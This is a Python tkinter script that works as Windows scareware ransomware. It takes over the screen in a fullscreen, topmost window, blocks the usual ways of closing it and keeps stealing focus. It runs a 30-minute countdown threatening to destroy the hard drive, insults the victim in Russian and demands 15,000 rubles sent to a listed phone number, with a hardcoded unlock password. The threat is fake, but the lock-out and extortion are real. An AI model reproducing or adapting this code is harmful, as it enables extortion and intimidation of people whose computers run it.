import tkinter as tk
from tkinter import messagebox
import time
import random
import sys
import winsound
import os

class FileAnimation:
    def __init__(self, parent):
        self.parent = parent
        self.frame = tk.Frame(parent, bg='gray', bd=2, relief='groove')
        self.frame.place(relx=0.98, rely=0.98, anchor='se', width=300, height=350)
        
        self.canvas = tk.Canvas(self.frame, bg='black', highlightthickness=0)
        self.canvas.pack(fill='both', expand=True)
        
        self.files = self.generate_file_list()
        self.active_files = []
        self.file_index = 0
        self.last_beep = 0
        self.start_time = time.time()
        
    def generate_file_list(self):
        system_files = [
            "[1] kernel32.dll", "[2] ntoskrnl.exe", "[3] hal.dll", 
            "[4] win32k.sys", "[5] explorer.exe", "[6] svchost.exe",
            "[7] csrss.exe", "[8] smss.exe", "[9] system32.dll",
            "[10] user32.dll", "[11] gdi32.dll", "[12] advapi32.dll",
            "[13] ntdll.dll", "[14] shell32.dll", "[15] msvcrt.dll",
            "[16] comctl32.dll", "[17] atapi.sys", "[18] tcpip.sys",
            "[19] disk.sys", "[20] SYSTEM", "[21] SOFTWARE",
            "[22] SECURITY", "[23] bootmgr", "[24] winload.exe",
            "[25] winresume.exe", "[26] pagefile.sys", "[27] registry",
            "[28] SAM", "[29] DEFAULT", "[30] DRIVERS"
        ]
        return system_files[:30]  # Берем первые 30 файлов
    
    def update_animation(self):
        self.canvas.delete('all')
        
        # Добавляем новый файл каждые 0.5 секунд
        current_time = time.time()
        if current_time - self.start_time >= 0.5 and self.file_index < len(self.files):
            self.active_files.append({
                'text': self.files[self.file_index],
                'y': 0,
                'speed': 2.0,
                'color': '#00FF00'
            })
            self.file_index += 1
            self.start_time = current_time
        
        # Обновляем позиции файлов
        for file in self.active_files[:]:
            file['y'] += file['speed']
            if file['y'] > 350:
                self.active_files.remove(file)
            else:
                self.canvas.create_text(
                    10, file['y'],
                    text=file['text'],
                    fill=file['color'],
                    font=('Courier New', 10),
                    anchor='w'
                )
        
        # Звуковой сигнал каждую секунду
        if current_time - self.last_beep >= 1.0:
            winsound.Beep(1000, 100)
            self.last_beep = current_time
        
        self.parent.after(50, self.update_animation)

def disable_event():
    return "break"

def check_password():
    entered_password = password_entry.get()
    if entered_password == "123456789":
        root.destroy()
        sys.exit()
    else:
        messagebox.showerror("Ошибка", "Неверный пароль! Попробуйте снова.")
        password_entry.delete(0, tk.END)
        password_entry.focus_set()

def update_timer():
    global remaining_time
    if remaining_time > 0:
        mins, secs = divmod(remaining_time, 60)
        timer_label.config(text=f"{mins:02d}:{secs:02d}")
        remaining_time -= 1
        root.after(1000, update_timer)
        
        if remaining_time % 2 == 0:
            warning_label.config(fg='red')
        else:
            warning_label.config(fg='black')
        
        if remaining_time < 60:
            timer_label.config(fg=random.choice(['red', 'white', 'yellow']))
    else:
        timer_label.config(text="00:00", fg='red')
        warning_label.config(text="Ваш жесткий диск сломан!", fg='red')
        simulate_crash()

def simulate_crash():
    for _ in range(20):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        error = tk.Label(root, 
                       text="SYSTEM ERROR", 
                       fg='white', 
                       bg='red', 
                       font=('Arial', random.randint(8, 20)))
        error.place(x=x, y=y)
        root.update_idletasks()

# Основное окно
root = tk.Tk()
root.title(" ")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='black')

# Блокировка закрытия
root.protocol("WM_DELETE_WINDOW", disable_event)
for key in ['<Alt-F4>', '<Control-w>', '<Escape>']:
    root.bind(key, disable_event)

# Таймер (30 минут)
remaining_time = 30 * 60

# Интерфейс
timer_label = tk.Label(
    root,
    text="30:00",
    fg='red',
    bg='black',
    font=('Arial', 36, 'bold'),
    justify='center'
)
timer_label.pack(pady=(50, 0))

warning_label = tk.Label(
    root,
    text="По окончанию таймера ваш жесткий диск будет сломан",
    fg='red',
    bg='black',
    font=('Arial', 16, 'bold'),
    justify='center'
)
warning_label.pack(pady=(10, 30))

label = tk.Label(
    root,
    text="Поздравляем, вы далбоёб!\nСкидывайте мне 15 000р на этот номер: +7 914 267 24 91 сбер",
    fg='red',
    bg='black',
    font=('Arial', 24, 'bold'),
    justify='center'
)
label.pack(pady=(0, 30))

# Поле ввода пароля (исправленное)
password_entry = tk.Entry(
    root,
    show="*",
    font=('Arial', 18),
    width=20,
    bg='white',
    fg='black',
    insertbackground='black'
)
password_entry.pack(pady=(0, 20))
password_entry.focus_set()  # Автоматический фокус на поле ввода

button = tk.Button(
    root,
    text="Проверить пароль",
    command=check_password,
    bg='black',
    fg='white',
    font=('Arial', 16),
    relief='flat',
    activebackground='red',
    activeforeground='white'
)
button.pack()

# Анимация файлов
file_animation = FileAnimation(root)
file_animation.update_animation()

# Таймер и фокус
update_timer()

def force_focus():
    root.focus_force()
    root.after(500, force_focus)

force_focus()

root.mainloop()